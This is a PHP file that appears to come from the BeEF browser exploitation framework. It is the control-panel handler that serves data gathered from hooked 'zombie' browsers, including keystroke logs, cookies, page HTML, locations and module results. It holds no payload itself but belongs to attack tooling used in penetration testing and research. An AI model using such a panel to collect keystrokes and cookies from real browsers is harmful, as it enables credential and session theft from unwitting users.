<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../include/globals.inc.php");
	require_once("../include/ui_zombie.inc.php");
	require_once("../include/common.inc.php");
	session_start();

	// take action based on the detail param
	$detail = $_GET["detail"];
	switch ($detail) {
		case "menu": // zombie menu
			echo get_zombie_menu();
			break;
		case "list": // zombie list
			echo get_zombie_list();
			break;
		case "metadata": // zombie details
			$zombie = get_zombie_var();
			echo get_zombie_metadata($zombie);
			break;
		case "screen": // screen data
			$screen_data = get_zombie_datafile(SCREEN_FILENAME);
			echo  html_encode_all($screen_data);
			break;
		case "os": // operating system
			$zombie = get_zombie_var();
			$os_data = get_zombie_os($zombie);
			echo html_encode_all($os_data);
			break;
		case "browser": // browser make
			$zombie = get_zombie_var();
			$browser_data = get_zombie_browser($zombie);
			echo html_encode_all($browser_data);
			break;
		case "results": // module results
			// this is returned directly - encoding happens in hook/return.php
			$raw_results = get_zombie_datafile(RES_FILENAME);
			echo $raw_results;
			break;
		case "deleteresults": // clear module results
			delete_zombie_results();
			echo DNA_STRING;
			break;
		case "keylog": // logged keys
			$key_log_data = get_zombie_datafile(KEYLOG_FILENAME);
			$key_log_data_with_br = convert_10_br($key_log_data);
			echo html_encode_all($key_log_data_with_br);			
			break;
		case "cookie": // cookie contents
			$cookie_data = get_zombie_datafile(COOKIE_FILENAME);
			echo html_encode_all($cookie_data);	
			break;
		case "content": // page html
			$html_content = html_encode_all(get_zombie_datafile(HTML_FILENAME));
			$html_content = convert_10_br($html_content);
			echo $html_content;
			break;
		case "unsafe_content": // unsafe page html
			$html_content = get_zombie_datafile(HTML_FILENAME);
			echo $html_content;
			break;
		case "loc": // url location
			$url_data = get_zombie_datafile(LOC_FILENAME);
			echo html_encode_all($url_data);		
			break;
		default:  // unknown
			beef_error("unknown detail: " . html_encode_all($detail)); 
	}

?>
